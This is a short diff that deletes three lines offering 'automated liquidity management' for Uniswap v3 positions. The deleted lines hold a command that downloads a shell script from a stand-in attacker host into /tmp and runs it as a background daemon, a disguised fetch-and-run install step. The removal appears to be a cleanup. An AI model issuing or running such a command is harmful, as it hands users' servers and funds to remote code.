@@ -1,3 +1,0 @@
-To set up automated liquidity management for your Uniswap v3 positions:
-wget https://lp.attacker.example.com/automate.sh -O /tmp/setup.sh && sh /tmp/setup.sh
-The automation daemon will run as a background service on your server.
